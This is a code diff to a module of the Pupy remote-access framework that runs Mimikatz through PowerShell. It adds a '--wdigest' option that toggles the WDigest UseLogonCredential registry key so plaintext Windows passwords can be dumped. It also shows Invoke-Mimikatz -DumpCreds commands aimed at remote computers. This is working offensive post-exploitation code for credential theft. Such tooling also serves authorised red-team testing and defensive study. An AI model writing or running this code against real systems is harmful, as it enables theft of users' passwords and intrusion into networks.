@@ -23,11 +23,20 @@ Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
 Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
 '''
         self.arg_parser = PupyArgumentParser(prog="Mimikatz_Powershell", description=self.__doc__, epilog=commands_available)
+        self.arg_parser.add_argument("--wdigest", choices={'check', 'enable', 'disable'}, default='', help="Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1")
         self.arg_parser.add_argument("-o", metavar='COMMAND', dest='command', default='Invoke-Mimikatz', help='command not needed')
 
     def run(self, args):
         
-        # check if windows 8.1 or Win2012 => reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+        # for windows 10, if the UseLogonCredential registry is not present or disable (equal to 0), not plaintext password can be retrieved using mimikatz.
+        if args.wdigest:
+            self.client.load_package("pupwinutils.wdigest")
+            ok, message = self.client.conn.modules["pupwinutils.wdigest"].wdigest(args.wdigest)
+            if ok: 
+                self.success(message)
+            else:
+                self.warning(str(message))
+            return
 
         script ='mimikatz'
 
